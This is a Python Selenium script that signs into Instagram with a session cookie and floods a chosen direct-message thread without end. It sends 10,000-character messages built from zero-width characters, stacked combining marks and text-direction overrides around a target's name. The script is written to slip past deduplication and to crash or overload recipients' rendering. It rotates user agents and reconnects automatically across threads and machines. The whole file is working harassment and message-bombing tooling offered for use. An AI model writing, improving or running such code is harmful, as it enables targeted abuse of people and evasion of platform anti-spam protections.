# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (GLOBAL BLACKOUT)
# 📅 STATUS: HYPER-DENSITY x70 | AUTO-RECONNECT | REGION-ROTATION

import os, time, random, sys, gc, threading
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS_PER_MACHINE = 2
MACHINE_ID = os.getenv("MACHINE_ID", "GLOBAL")

def get_hyper_payload(target_name):
    u_id = random.randint(100000, 999999)
    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n🆔 GLOB_{u_id}\n"
    atom = "\u034F"
    z_tower = "̸" * 700
    # 7500 chars of randomized noise to bypass deduplication
    noise = "".join(random.choice(["\u200C", "\u200D", "\u2060", "\u2063", "\u2064"]) for _ in range(7500))

    lines = [header, noise]
    for i in range(45):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        lines.append(f"\u2800\u00A0{atom}{prefix}{target_name.upper()}{z_tower}")
    
    return "\n".join(lines)[:10000]

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    # Randomized User-Agent
    ver = random.randint(120, 124)
    chrome_options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def agent_blitz(agent_id, cookie, target_id, target_name):
    while True: # 🔄 AUTO-RECONNECT LOOP
        driver = None
        try:
            print(f"📡 [M{MACHINE_ID}-A{agent_id}] CONNECTING TO GLOBAL GRID...")
            driver = get_driver()
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(10)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(15)

            strike_count = 0
            while True:
                # 🚀 SOCKET HEALTH CHECK
                if strike_count > 20:
                    print(f"🔄 [M{MACHINE_ID}-A{agent_id}] ROTATING SOCKET...")
                    driver.refresh()
                    time.sleep(10)
                    strike_count = 0

                box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                payload = get_hyper_payload(target_name)
                
                driver.execute_script("""
                    var box = arguments[0];
                    document.execCommand('insertText', false, arguments[1]);
                    box.dispatchEvent(new Event('input', { bubbles: true }));
                """, box, payload)
                
                box.send_keys(Keys.ENTER)
                strike_count += 1
                print(f"💀 [M{MACHINE_ID}-A{agent_id}] HYPER-STRIKE {strike_count} DELIVERED", flush=True)
                
                # KILL LOCAL RENDER
                driver.execute_script("window.stop();")
                time.sleep(0.02)

        except Exception as e:
            print(f"⚠️ [M{MACHINE_ID}-A{agent_id}] CONNECTION LOST. REBOOTING...")
            if driver: driver.quit()
            time.sleep(10) # Wait before getting a new session/IP
            continue

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    with ThreadPoolExecutor(max_workers=THREADS_PER_MACHINE) as executor:
        for i in range(THREADS_PER_MACHINE):
            executor.submit(agent_blitz, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
